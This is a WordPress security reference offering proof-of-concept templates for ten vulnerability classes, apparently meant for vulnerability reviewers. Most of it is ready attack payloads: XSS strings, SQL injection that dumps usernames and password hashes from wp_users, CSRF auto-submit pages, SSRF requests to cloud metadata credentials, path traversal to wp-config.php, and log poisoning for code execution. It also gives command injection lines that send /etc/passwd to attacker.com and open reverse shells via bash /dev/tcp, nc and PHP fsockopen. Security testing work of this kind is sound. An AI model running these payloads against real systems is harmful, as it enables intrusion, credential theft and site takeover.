# WordPress Security PoC Templates

This document provides proof-of-concept templates for WordPress security vulnerabilities. Use these templates to demonstrate exploitability of confirmed findings.

## Table of Contents

1. [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
2. [SQL Injection](#sql-injection)
3. [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
4. [Open Redirect](#open-redirect)
5. [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
6. [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
7. [Object Injection](#object-injection)
8. [Command Injection](#command-injection)
9. [Auth Bypass](#auth-bypass)
10. [Options Manipulation](#options-manipulation)

---

## XSS (Cross-Site Scripting)

### Reflected XSS - HTML Context

**Basic Payload:**
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<script>alert('XSS')</script>
```

**PoC URL:**
```
https://example.com/page.php?param=<img src=x onerror=alert(document.domain)>
```

**Testing Steps:**
1. Navigate to vulnerable page
2. Enter payload in vulnerable parameter
3. Observe JavaScript execution in browser

### Reflected XSS - Attribute Context

**Attribute Breakout Payloads:**
```html
" onload="alert('XSS')
" onfocus="alert('XSS')" autofocus="
" onmouseover="alert('XSS')
' onload='alert(1)' class='
```

**PoC URL:**
```
https://example.com/page.php?name=" onload="alert(document.cookie)
```

**Example Vulnerable Code:**
```php
<input type="text" value="<?php echo $_GET['name']; ?>">
```

**Exploitation:**
```html
<!-- User input: " onload="alert(1) -->
<input type="text" value="" onload="alert(1)">
```

### Reflected XSS - JavaScript Context

**Payloads (when inside quotes):**
```javascript
'; alert('XSS'); //
"; alert('XSS'); //
';alert(String.fromCharCode(88,83,83));//
```

**Example Vulnerable Code:**
```php
<script>
var search = "<?php echo $_GET['q']; ?>";
</script>
```

**PoC URL:**
```
https://example.com/page.php?q="; alert(1); //
```

### Reflected XSS - CSS Context

**Payload for safecss_filter_attr without esc_attr:**
```css
" onload="alert(1)
;color:red" onload="alert(1)
```

**Example Vulnerable Code:**
```php
<div style="<?php echo safecss_filter_attr($_GET['css']); ?>">
```

**PoC URL:**
```
https://example.com/page.php?css=" onload="alert(1)
```

### Stored XSS - WordPress Blocks

**Block Payload:**
```html
<!-- wp:namespace/block-name {"attribute":"<img src=x onerror=alert(1)>"} /-->
```

**For attribute context:**
```html
<!-- wp:namespace/block-name {"className":"\" onload=\"alert(1)"} /-->
```

**For CSS context (safecss_filter_attr):**
```html
<!-- wp:namespace/block-name {"style":"\" onload=\"alert(1)"} /-->
```

### Stored XSS - Shortcodes

**Shortcode Payload:**
```
[shortcode_name attr='<img src=x onerror=alert(1)>']
[shortcode_name class='" onload="alert(1)']
```

### XSS - add_query_arg/remove_query_arg

**Payload:**
Relies on $_SERVER['REQUEST_URI'] containing malicious input.

**Attack Vector:**
```
https://example.com/page.php?x="><img src=x onerror=alert(1)>
```

If code uses:
```php
$url = add_query_arg('key', 'value'); // Current URL used
echo $url; // Outputs unescaped URL
```

The malicious REQUEST_URI will be reflected.

---

## SQL Injection

### Union-Based SQLi

**Basic Payload:**
```sql
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,username,password,null,null FROM wp_users--
```

**PoC Request:**
```
GET /page.php?id=1' UNION SELECT 1,user_login,user_pass,4,5 FROM wp_users-- HTTP/1.1
```

### Error-Based SQLi

**Payloads:**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user_login FROM wp_users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

### Boolean-Based Blind SQLi

**Payloads:**
```sql
' AND 1=1--  (True - page loads normally)
' AND 1=2--  (False - different response)
' AND (SELECT LENGTH(user_login) FROM wp_users LIMIT 1)=5--
```

**Testing Steps:**
1. Send true condition - observe normal response
2. Send false condition - observe different response
3. Confirms SQL injection vulnerability

### Time-Based Blind SQLi

**Payloads:**
```sql
' AND SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM wp_users WHERE ID=1)--
```

**Testing:**
- Submit payload
- Observe 5-second delay in response
- Confirms SQL injection

### ORDER BY Injection

**Payloads:**
```sql
?order=id ASC
?order=(SELECT CASE WHEN (1=1) THEN 'id' ELSE 'name' END)
?order=IF(1=1,id,name)
?order=id,(SELECT SLEEP(5))
```

**Example Vulnerable Code:**
```php
$order = $_GET['order'];
$wpdb->query("SELECT * FROM table ORDER BY $order");
```

### wpdb->prepare() First Argument Injection

**Payload:**
If user controls the query structure:
```php
$table = $_GET['table']; // User input: "wp_users WHERE 1=1--"
$wpdb->prepare("SELECT * FROM $table WHERE id = %d", $id);
```

**Attack:**
```
?table=wp_users WHERE 1=1 UNION SELECT 1,user_login,user_pass,4,5--
```

---

## CSRF (Cross-Site Request Forgery)

### CSRF - Form Auto-Submit

**HTML Attack Page:**
```html
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>Please wait...</h1>
<form id="csrf" action="https://target.com/admin/settings.php" method="POST">
  <input type="hidden" name="option_name" value="admin_email" />
  <input type="hidden" name="option_value" value="attacker@evil.com" />
  <input type="hidden" name="action" value="update" />
</form>
<script>
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Attack Scenario:**
1. Attacker hosts HTML page on attacker.com
2. Admin visits attacker.com while logged into WordPress site
3. Form auto-submits to target site
4. Action executes with admin's session (no nonce check)

### CSRF - Image Tag (GET-based)

**For GET-based actions:**
```html
<img src="https://target.com/admin/action.php?action=delete_user&user_id=5">
```

**Email Attack Vector:**
```html
<img src="https://target.com/wp-admin/options.php?option_name=admin_email&option_value=attacker@evil.com&action=update" width="1" height="1">
```

Victim just needs to view the email/page while logged in.

### CSRF - XMLHttpRequest

**For modern AJAX endpoints:**
```html
<script>
fetch('https://target.com/wp-admin/admin-ajax.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'action=delete_post&post_id=123'
});
</script>
```

### Testing CSRF

**Steps:**
1. Create HTML file with exploit code
2. Host on attacker-controlled domain
3. Authenticate as victim on target site (separate browser tab)
4. Visit attacker's HTML page
5. Verify action executes without nonce

**Successful Exploit Indicators:**
- Settings changed
- User deleted
- Option updated
- File uploaded

---

## Open Redirect

### Basic Open Redirect

**Payload:**
```
https://example.com/redirect.php?url=https://evil.com
https://example.com/page.php?return_url=//evil.com
https://example.com/login.php?redirect_to=https://attacker.com/phishing
```

**Vulnerable Code Example:**
```php
wp_redirect($_GET['redirect_to']);
```

### Bypass Techniques

**Protocol-relative URL:**
```
?redirect=//evil.com
```

**URL parsing bypass:**
```
?redirect=https://evil.com@target.com
?redirect=https://target.com.evil.com
```

### Phishing Scenario

**Attack Flow:**
1. Attacker sends link: `https://legitimate-site.com/login.php?redirect=https://evil.com/fake-login`
2. User logs into legitimate site
3. Site redirects to attacker's fake login page (looks identical)
4. User enters credentials again → stolen

**PoC:**
```
https://example.com/auth.php?redirect_to=https://evil.com/phishing.html
```

---

## SSRF (Server-Side Request Forgery)

### Internal Network Scanning

**Payloads:**
```
?url=http://127.0.0.1
?url=http://localhost
?url=http://192.168.1.1
?url=http://10.0.0.1
?url=http://172.16.0.1
```

**Port Scanning:**
```
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
?url=http://127.0.0.1:6379
```

### Cloud Metadata Access (AWS)

**Payload:**
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Steal AWS IAM credentials

### File Protocol (If Allowed)

**Payload:**
```
?url=file:///etc/passwd
?url=file:///var/www/html/wp-config.php
```

### Vulnerable Code Example

```php
$url = $_GET['url'];
$response = wp_remote_get($url);
echo wp_remote_retrieve_body($response);
```

### Testing SSRF

**Step 1: Test Internal Access**
```
?url=http://127.0.0.1
```
Look for localhost content in response.

**Step 2: Test Cloud Metadata**
```
?url=http://169.254.169.254/latest/meta-data/
```

**Step 3: Use External Service**
```
?url=http://burpcollaborator.net/uniqueid
```
Check if server makes request to your controlled domain.

---

## LFI (Local File Inclusion)

### Path Traversal Payloads

**Basic:**
```
?file=../../../etc/passwd
?page=../../../../var/www/html/wp-config.php
?template=../../../wp-config.php
```

**Encoded:**
```
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//....//etc/passwd
```

**Null Byte (PHP < 5.3.4):**
```
?file=../../../etc/passwd%00
```

### WordPress-Specific Targets

**Sensitive Files:**
```
../wp-config.php
../../../wp-config.php
../../../../wp-config.php
```

**PoC Payload:**
```
?page=../../wp-config
```

**Expected Output:** Database credentials, salts, keys

### Vulnerable Code Example

```php
$file = $_GET['file'];
include('templates/' . $file . '.php');
```

**Exploitation:**
```
?file=../../../wp-config
// Results in: include('templates/../../../wp-config.php');
```

### Log Poisoning (LFI to RCE)

**If logs are readable:**
```
1. Poison log via User-Agent:
   User-Agent: <?php system($_GET['cmd']); ?>

2. Include log:
   ?file=../../../../var/log/apache2/access.log&cmd=whoami
```

---

## Object Injection

### Basic Object Injection PoC

**Vulnerable Code:**
```php
$data = unserialize($_COOKIE['user_data']);
```

**Attack Requirements:**
1. POP (Property-Oriented Programming) chain exists
2. Classes with __destruct, __wakeup, __toString magic methods

**Example Serialized Payload:**
```
O:4:"Evil":1:{s:4:"file";s:15:"/tmp/shell.php";}
```

**Testing:**
```
Set-Cookie: user_data=O:4:"Evil":1:{s:4:"file";s:15:"/tmp/shell.php";}
```

### WordPress-Specific POP Chains

**Note:** Exploitation requires identifying gadget chains in installed plugins/themes.

**Generic Test Payload:**
```php
// Create serialized object
class TestObject {
    public $test = "<?php phpinfo(); ?>";
}
echo base64_encode(serialize(new TestObject()));
```

**PoC Steps:**
1. Identify unserialize() call with user input
2. Analyze codebase for POP gadget chains
3. Craft serialized payload exploiting chain
4. Base64 encode if passed through encoding
5. Submit payload via vulnerable parameter

---

## Command Injection

### Basic Command Injection

**Linux Payloads:**
```
; ls -la
| cat /etc/passwd
&& whoami
` ls `
$(ls)
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
```

**Command Chaining:**
```
|| id
; sleep 10
| whoami
```

### Blind Command Injection

**Time-based detection:**
```
; sleep 10
; ping -c 10 127.0.0.1
```

**Out-of-band detection:**
```
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

### Vulnerable Code Example

```php
$host = $_GET['host'];
system('ping -c 4 ' . $host);
```

**Exploitation:**
```
?host=127.0.0.1; cat /etc/passwd
?host=127.0.0.1 | nc attacker.com 1234 -e /bin/sh
```

### WordPress-Specific Payloads

**If command operates on files:**
```
?file=test.txt; cat wp-config.php
?path=/tmp/../../../etc/passwd
```

### RCE via Command Injection

**Reverse Shell:**
```
; bash -i >& /dev/tcp/attacker.com/1234 0>&1
; nc attacker.com 1234 -e /bin/sh
; php -r '$sock=fsockopen("attacker.com",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Auth Bypass

### wp_set_auth_cookie Bypass

**Vulnerable Code:**
```php
wp_set_auth_cookie($_GET['user_id']);
```

**PoC:**
```
GET /vulnerable-page.php?user_id=1 HTTP/1.1
```

**Result:** Authenticates as user ID 1 (typically admin)

### permission_callback Bypass

**Vulnerable REST Route:**
```php
register_rest_route('ns/v1', '/admin', [
    'callback' => 'admin_action',
    'permission_callback' => '__return_true' // Always allows access
]);
```

**PoC:**
```
POST /wp-json/ns/v1/admin HTTP/1.1
Content-Type: application/json

{"action":"delete_all_users"}
```

**No authentication required** - endpoint is publicly accessible.

### Capability Check Bypass

**Missing Capability Check:**
```php
// No current_user_can check
if (isset($_POST['promote_user'])) {
    $user = get_user_by('id', $_POST['user_id']);
    $user->set_role('administrator');
}
```

**PoC:**
```
POST /admin-action.php HTTP/1.1

promote_user=1&user_id=2
```

**Any logged-in user can promote themselves to admin.**

---

## Options Manipulation

### Arbitrary Option Update

**Vulnerable Code:**
```php
update_option($_POST['option_name'], $_POST['option_value']);
```

**PoC - Change Admin Email:**
```
POST /update-settings.php HTTP/1.1

option_name=admin_email&option_value=attacker@evil.com
```

**PoC - Enable User Registration:**
```
POST /update-settings.php HTTP/1.1

option_name=users_can_register&option_value=1
```

**PoC - Change Default User Role:**
```
POST /update-settings.php HTTP/1.1

option_name=default_role&option_value=administrator
```

### Exploitation Scenarios

**Scenario 1: Account Takeover**
1. Change admin_email to attacker's email
2. Request password reset
3. Receive reset link
4. Take over admin account

**Scenario 2: Privilege Escalation**
1. Change default_role to administrator
2. Register new account
3. New account has admin privileges

**Scenario 3: Backdoor Installation**
1. Update option to contain PHP code (if eval'd anywhere)
2. Inject malicious code into theme/plugin settings

---

## General PoC Guidelines

### PoC Structure

For each vulnerability, provide:

1. **Request Details**
   - HTTP method (GET/POST)
   - URL with payload
   - Headers (if relevant)
   - Body data (for POST)

2. **Payload Explanation**
   - What the payload does
   - Why it works (missing sanitization)

3. **Expected Result**
   - What happens when executed
   - Evidence of vulnerability (alert box, data disclosure, unauthorized action)

4. **Impact Statement**
   - What attacker can achieve
   - Severity justification

### Testing Guidelines

1. **Always test in safe environment** - Never test on production without permission
2. **Document everything** - Screenshots, request/response logs
3. **Verify exploitability** - Ensure payload actually works, not just theoretical
4. **Consider defense bypass** - Check if WAF/filters block payload
5. **Provide remediation** - Show fixed code alongside PoC

### Payload Encoding

Some payloads may need encoding:

**URL Encoding:**
```
" → %22
< → %3C
> → %3E
```

**HTML Entity Encoding:**
```
< → &lt;
> → &gt;
" → &quot;
```

**Base64 Encoding:**
```
Used for: Object Injection, Command Injection payloads passed through encoding
```

---

**End of PoC Templates Document**
